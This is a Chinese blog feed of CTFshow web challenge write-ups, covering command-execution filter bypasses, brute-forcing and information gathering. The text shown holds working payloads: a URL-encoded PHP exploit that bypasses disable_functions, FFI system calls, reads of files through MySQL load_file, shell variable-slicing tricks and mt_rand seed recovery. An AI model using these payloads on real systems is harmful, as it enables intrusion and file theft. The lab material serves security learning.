class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i))<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">20</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc_addr<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>fake_obj_offset)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span>xd<span class="hljs-number">0</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">38</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%201</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%204</span>)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>write(<span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%200</span>xd<span class="hljs-number">0</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>b<span class="hljs-variable">%200</span><span class="hljs-keyword">x</span><span class="hljs-number">68</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>zif_system)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span>helper-<span class="hljs-variable">%3</span>eb)(<span class="hljs-variable">%24</span>cmd)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>exit()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>ctfshow(<span class="hljs-variable">%22</span>cat<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>fflag<span class="hljs-number">0</span>.txt<span class="hljs-variable">%22</span>)<span class="hljs-variable">%3</span>bob_end_flush()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<br></code></pre></td></tr></table></figure><h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><ul><li>&#96;&#96;&#96;shell<br>c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);?><br>#利用脚本找到flag存放在flagc.txt中<br>#glob:&#x2F;&#x2F; 查找匹配的文件路径模式<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>- ```shell<br>  c=include(<span class="hljs-string">&#x27;/flagc.txt&#x27;</span>);<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure></li></ul><h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><ul><li><pre><code class="shell">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);?&gt;c=include(&#39;/flagx.txt&#39;);exit(0);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web75</span><br><br>- ```shell<br>  c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>扫一遍目录发现flag在flag36.txt中</p></li><li><p>使用include发现include被open_basedir禁用</p></li><li><p>使用mysql的load_file读取文件</p></li><li><pre><code class="shell">c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;,&#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 这个脚本的意思大致揣摩就是<span class="hljs-keyword">new</span>了个本地数据库，并找到数据库中包含flag文件的库把它打印出来<br><br>- 如此骚操作，第一次见，📝<br><br><span class="hljs-comment">### web76</span><br><br>- ```shell<br>  c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>扫一遍目录发现flag在flag36d.txt中</p></li><li><p>类似web75把36变36d</p></li><li><pre><code class="shell">c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;,&#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36d.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web77</span><br><br>- ```shell<br>  c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>扫一遍目录发现flag在flag36x.txt中</p></li><li><p>同时注意到目录里有一个readflag</p></li><li><p>这道题使用的是FFI</p></li><li><p>FFI（Foreign Function Interface)即外部函数接口，就是在一种语言里面调另一种语言的代码技术</p></li><li><p>PHP的FFI扩展就是让你在PHP里面调用C的代码技术（只有PHP7.4以上才有）</p></li><li><pre><code class="shell">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的$ffi-&gt;system($a);//通过$ffi去调用system函数<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>- 浏览器访问/1.txt得到flag<br><br><span class="hljs-comment">### web118</span><br><br>- ```<br>  1.<span class="hljs-variable">$PATH</span> <br>  用途：可执行文件的搜索路径。<br>  用例：<span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>通常是bin结尾<br>  2. <span class="hljs-variable">$PWD</span><br>  用途：工作目录(你当前所在的目录)<br>  用例：<span class="hljs-built_in">echo</span> <span class="hljs-variable">$PWD</span>题目环境中肯定是/var/www/html<br>  而字母起到的作用是和0一样的<br>  结合图片组合html的l和bin的n<br>  所以<span class="hljs-variable">$&#123;PATH:~A&#125;</span>是n<span class="hljs-variable">$&#123;PWD:~A&#125;</span>是l合起来就是<span class="hljs-built_in">nl</span><br>  <span class="hljs-built_in">nl</span>命令主要是在打印内容是添加行号（Linux命令）<br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;shell<br>${PATH:<del>A}${PWD:</del>A} ????.??? #再查看源码拿flag</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"><br>### web119<br><br>- ban掉了<span class="hljs-type">PATH</span>和<span class="hljs-type">BASH</span><br><br>- ```shell<br>  <span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOSTNAME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;     ====&gt;   t<br>  <br>  <span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>:<span class="hljs-string">$&#123;</span><span class="hljs-type">Z</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;    ====&gt;   /<br>  <br>  /bin/cat flag.php<br>  <br>  <span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>:<span class="hljs-string">$&#123;</span>#&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>:<span class="hljs-string">$&#123;</span>#&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;??<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOSTNAME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125; ????.???<br></code></pre></td></tr></table></figure></li></ul><h3 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h3><ul><li>&#96;&#96;&#96;php<?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST['code'])){    $code=$_POST['code'];    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){            if(strlen($code)>65){            echo '<div align="center">'.'you are so long , I dont like '.'</div>';        }        else{        echo '<div align="center">'.system($code).'</div>';        }    }    else{     echo '<div align="center">evil input</div>';    }}?><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>- ```shell<br>  code=<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>?????<span class="hljs-variable">$&#123;#RANDOM&#125;</span> ????.???<br>  /bin/base64 flag.php<br>  <span class="hljs-comment"># 最后在base64解码一下</span><br>  <span class="hljs-comment"># 多试几次</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="hljs-variable">$code</span>))&#123;    <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">65</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-string">&#x27;you are so long , I dont like &#x27;</span>.<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>&#96;&#96;&#96;shell<br>code&#x3D;${PWD::$</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_爆破</title>
    <link href="/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/"/>
    <url>/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><ul><li><p>非常经典的爆破</p></li><li><p>使用BurpSuite工具</p></li><li><p><img src="https://img-blog.csdnimg.cn/1fb1610cb59d4aea9ad89deefb0bad75.png#pic_center" alt="点提交抓个包先"></p></li><li><p><img src="https://img-blog.csdnimg.cn/841473255fb0440d971ea45cbc144b84.png#pic_center" alt="对选择区域发到decoder里面发现是base64编码"></p></li><li><p>send to intruder准备爆破</p></li><li><p><img src="https://img-blog.csdnimg.cn/c0acad17193840a6b0dcad2ee03970a4.png#pic_center" alt="选择一手自定义迭代器类型的payload"></p></li><li><p><img src="https://img-blog.csdnimg.cn/2daa0d82e07e424f97b8a28e63bed4a5.png#pic_center" alt="第一个位置admin"></p></li><li><p><img src="https://img-blog.csdnimg.cn/74252d156c6840e289a274d6d8353551.png#pic_center" alt="第二个位置："></p></li><li><p><img src="https://img-blog.csdnimg.cn/22eb07eb81404610ab7c0bea1b98c2dc.png#pic_center" alt="第3个位置为下载得到的密码txt"></p></li><li><p><img src="https://img-blog.csdnimg.cn/3a67cf857e2b43cc845162d2262c69ad.png#pic_center" alt="选择编码base64和取消下面的url编码"></p></li><li><p><img src="https://img-blog.csdnimg.cn/7a5a7a3840a54281a88b0364b76915ca.png#pic_center" alt="爆破拿旗"></p></li></ul><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><ul><li>它说域名失效了，让我直接交flag，那好吧😄</li></ul><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><ul><li><p><img src="https://img-blog.csdnimg.cn/db461b2d96a743d79e0f0781497d717c.png" alt="打开题目就是源码"></p></li><li><p>条件有点多啊，有点不想用bp，决定尝试用脚本</p></li><li><p>在看一眼题目，这不就是要👴找个token嘛，后面逻辑直接cv，没学php嗯写</p></li><li><pre><code class="php">&lt;?phpfor ($i=0;$i&lt;10000;$i=$i+1)&#123;    $token=md5($i);    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;            echo $i;        &#125;    &#125;&#125;;<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 运行结果得到token为<span class="hljs-number">422</span><br>- ![在这里插入图片描述](https:<span class="hljs-comment">//img-blog.csdnimg.cn/ef94884278044c54bebd1fcb955d194c.png)</span><br><br><span class="hljs-comment">### web24</span><br><br>- ![打开题目康一康，又是php，没学过，无所谓，冷静分析一下](https:<span class="hljs-comment">//img-blog.csdnimg.cn/f6097a645d154cf3ae590a86edf32ad4.png)</span><br><br>- mt_srand这名字一看就是随机数，那我种子一样是不是结果就一样（毕竟没有真正的随机）<br><br>- ![来吧脚本小子](https:<span class="hljs-comment">//img-blog.csdnimg.cn/a85e3eb2be1f4a1fb9adf2959b711e13.png)</span><br><br>- ![无敌是多么。。。](https:<span class="hljs-comment">//img-blog.csdnimg.cn/f46751b46e85406488a89394ded938e5.png)</span><br><br><span class="hljs-comment">### web25</span><br><br>```php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<span class="hljs-comment">#对flag里面的东西substr一下还要hexdec十六进制转十进制才得到的种子？这么骚？</span><br>    <span class="hljs-variable">$rand</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$r</span>)-<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<span class="hljs-comment">#rand=r-第一个随机值</span><br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<span class="hljs-comment">#要求rand==0也就是说r传的值就是第一个随机值</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(<span class="hljs-title function_ invoke__">mt_rand</span>()+<span class="hljs-title function_ invoke__">mt_rand</span>()))&#123;<span class="hljs-comment">#token==第二个随机值+第三个随机值</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /proc/ersion&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p>心态爆炸</p></li><li><p>看大佬的WP</p></li><li><p>加载中。。。</p></li><li><p>😯当我r&#x3D;0时可以得到第一个随机值也就是-rand本题我得到的是<strong>783167475</strong>（每人都不一样！）</p></li><li><p>然后可以根据第一个随机值回推种子</p></li><li><p>怎么回推？借助工具：<a href="https://github.com/Al1ex/php_mt_seed">https://github.com/Al1ex/php_mt_seed</a></p></li><li><p>👴反正是第一次见到</p></li><li><p><img src="https://img-blog.csdnimg.cn/5bdc3a294142464987b671fa1d5c2188.png" alt="php版本不同还不一样，我草了，不过👴盲猜是后面的，直接手动试错了mlgb"></p></li><li><p><img src="https://img-blog.csdnimg.cn/8f6bdaad826e4a8cb593f3a804759241.png" alt="1371411132就决定是你了"></p></li><li><p><img src="https://img-blog.csdnimg.cn/f46ba476b3234529a3aeccc0f55d5119.png" alt="传一下r和token拿🇺🇳"></p></li></ul><h3 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h3><ul><li><p><img src="https://img-blog.csdnimg.cn/7644ae5c35ef4b9891a6124087b51dbb.png" alt="打开题目"></p></li><li><p><img src="https://img-blog.csdnimg.cn/161db37d70c84c77b681522d9e4f5c67.png" alt="抓个包试试，随便发一下，我的fuck"></p></li><li><p>我不管我就是拿到flag了👋我是秀儿</p></li></ul><h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><ul><li><p><img src="https://img-blog.csdnimg.cn/1e02406883e342e8b83445abf99e2bab.png" alt="先欣赏一波界面😄"></p></li><li><p><img src="https://img-blog.csdnimg.cn/e01420a4cf7e434cab1561caa74675d6.png" alt="点开录取名单"></p></li><li><p><img src="https://img-blog.csdnimg.cn/604f94a8d126442e8d755513c598aea9.png" alt="点开学生学籍查询系统"></p></li><li><p>思路出现：爆破出学生身份证号</p></li><li><p>Burp Suite爆破</p></li><li><p>观察：身份证号缺失的那几位是出生日期</p></li><li><p><img src="https://img-blog.csdnimg.cn/24e8cffc165a4e4c92a1076d0c654236.png" alt="对‘高先伊’同学进行一手抓包"></p></li><li><p><img src="https://img-blog.csdnimg.cn/f13bc760f5a24a2497291a37c30cefa0.png" alt="选参数"></p></li><li><p><img src="https://img-blog.csdnimg.cn/1598787fd01142c8b55444eef5e22418.png" alt="找到msg✌️"></p></li><li><p><img src="https://img-blog.csdnimg.cn/9eb4a4aa2a01495f91b446f7ec22c434.png" alt="翻译一下"></p></li><li><p><img src="https://img-blog.csdnimg.cn/40a37be3aba6477095b62b0879097055.png" alt="get it！"></p></li></ul><h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3><ul><li><p>提示：通过暴力剖解目录&#x2F;0-100&#x2F;0-100看返回数据包</p></li><li><p>我的Burp Suite是社区版所以很慢，索性当脚本小子</p></li><li><pre><code class="python">import requestsfor i in range(100):    for j in range(100):        url = f&quot;http://3eed592c-7498-44a9-897c-ee8ef5484300.challenge.ctf.show/&#123;i&#125;/&#123;j&#125;/&quot;        headers = &#123;        &#39;Host&#39;: &#39;3eed592c-7498-44a9-897c-ee8ef5484300.challenge.ctf.show&#39;,        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&#39;,        &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;,        &#39;Accept-Language&#39;: &#39;en-US,en;q=0.5&#39;,        &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,        &#39;Connection&#39;: &#39;close&#39;,        &#125;        print(url)        req = requests.get(url,headers)        print(req.status_code)</code></pre></li><li><p>爆出来是72 和 20</p></li><li><p><img src="https://img-blog.csdnimg.cn/9ece5333c7c04d6bb053827e22092d92.png" alt="访问一下得🇺🇳"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_信息搜集</title>
    <link href="/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><ul><li>查看源代码直接找到</li></ul><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><ul><li>火狐浏览器网址上输入config：about后打开设置禁止js（绕过js前端验证）</li><li>查看源码</li></ul><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><ul><li>bp抓包</li><li>把GET改成POST</li><li>Repeat了一下就出来flag了</li></ul><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><ul><li>根据提示看一下robots协议</li><li>看到flagishere.txt访问一下</li><li>出flag</li></ul><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><ul><li>访问index.phps后下载文件打开即得flag</li></ul><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><ul><li>使用diesearch扫出<a href="http://www.zip/">www.zip</a></li><li>访问下载得到flag</li></ul><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><ul><li>提示：版本控制很重要</li><li>联想：用什么控制版本？git！</li><li>访问 <em><strong>.git&#x2F;</strong></em> 得flag</li></ul><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><ul><li>提示：版本控制很重要（怎么又是这个？）</li><li>联想：除了git还有什么可以控制版本？svn!</li><li>访问 ***.svn&#x2F;***得flag</li></ul><h3 